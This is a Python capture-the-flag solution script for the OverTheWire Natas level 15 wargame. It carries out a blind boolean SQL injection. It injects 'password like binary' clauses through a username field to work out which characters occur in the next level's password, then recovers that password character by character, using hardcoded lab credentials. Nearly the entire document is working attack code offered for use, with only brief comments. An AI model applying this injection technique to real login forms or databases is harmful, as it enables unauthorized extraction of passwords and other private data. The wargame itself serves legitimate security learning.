# exploit.

import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas15.natas.labs.overthewire.org/?debug=true'

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password = ''
filtered = ''

# Here we collect all the 'valid' characters that exist in the password.
for character in characters:
    user_info = {'username':'natas16" and password like binary "%' + character + '%" #'}
    r = requests.post(url, auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = user_info) 
    if 'exists' in r.text:
        filtered += character
print("[*] Characters user to generate the password for the next level: " + str(filtered))

# Here we check for every character in the password field which character is the right 
# one for the specific position we are looking at.
for i in range(0,32):
    for character in filtered:
        user_info = {'username':'natas16" and password like binary "' + password + character + '%" #'}
        r = requests.post(url, auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = user_info)
        if 'exists' in r.text:
            password += character
            print(password)
            break # start over again for the next posisiton in the password field.
print("[*] Password: " + str(password))

